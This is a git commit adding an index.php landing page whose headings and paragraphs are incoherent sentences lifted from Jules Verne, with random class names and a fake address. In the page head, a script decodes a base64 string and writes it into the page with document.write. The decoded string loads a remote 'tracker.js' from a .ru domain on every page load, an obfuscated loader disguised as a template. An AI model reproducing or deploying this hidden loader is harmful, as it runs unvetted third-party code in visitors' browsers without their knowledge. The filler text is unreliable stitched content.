355ca41512f1602298b1e153e39529078e679eab
qeschcwx <77186012+qeschcwx@users.noreply.github.com>
2021-01-09 08:11:35 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The captain rose, telling me to follow him. I had had time t</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9lM3RyZ29kbjVrMGNtaDRkbXciPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="iwv7wfbii7p5ce5nk">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="e4t0olbxapk5cpz8r5ab2gu0">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The captain rose, telling me to follow him. I had had time t</h1>
+	</section>
+
+
+	<section class="our-work" class="ns4sgzis4f02uaqvmz">
+		<h3 class="title">M. Aronnax, I will answer you to-day as I did seven</h3>
+		<p>Have you no need of my services, sir? Well? I asked, not catching the captain's idea. From Keeling Island our course was slower and more variable, often taking us into great depths. Several times they made use of the inclined planes, which certain internal levers placed obliquely to the water-line. In that way we went about two miles, but without ever obtaining the greatest depths of the Indian Sea, which soundings of seven thousand fathoms have never reached. As to the temperature of the lower strata, the thermometer invariably indicated 4 above zero. I only observed that, in the upper regions, the water was always colder in the high levels than at the surface of the sea. A speed of fifty miles an hour.</p>
+		<hr>
+
+		<ul class="grid" class="n0g6p7i91562qs6ra85zltbk">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="iwv7wfbii7p5ce5nk">
+		<h3 class="title">The vessel was within two miles of us. It </h3>
+		<p>You may speak, said the captain. This man does not understand French. We are going backward? said Conseil. But I had just returned from a fatiguing journey, weary, and longing for repose. I aspired to nothing more than again seeing my country, my friends, my little lodging by the Jardin des Plantes, my dear and precious collections. But nothing could keep me back! I forgot all-fatigue, friends, and collections-and accepted without hesitation the offer of the American government. Why not, M. Aronnax?</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="e4t0olbxapk5cpz8r5ab2gu0" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="n0g6p7i91562qs6ra85zltbk" class="title">Is Conseil going to risk it? asked Ned.</h3>	
+		<p>About five yards from me a shadow appeared and sank to the ground. The disquieting idea of sharks shot through my mind, but I was mistaken; and once again it was not a monster of the ocean that we had anything to do with. Friend Ned, answer me frankly, are you tired of being on board? Are you sorry that destiny has thrown us into Captain Nemo's hands? Only one observation-just one. The occasion must be serious, and our first attempt must succeed; if it fails, we shall never find another, and Captain Nemo will never forgive us. As soon as I had changed my clothes, I went up on to the platform, and, a prey to conflicting emotions, I sat down near the binnacle. Captain Nemo joined me. I rose and said to him:</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="iwv7wfbii7p5ce5nk">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="e4t0olbxapk5cpz8r5ab2gu0"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ns4sgzis4f02uaqvmz"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="n0g6p7i91562qs6ra85zltbk"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>94758 Theresia Junctions, Apt. 084, 88770, Paulville, Idaho, United States</p>
+	</footer>
+
+</body>
+
+</html>
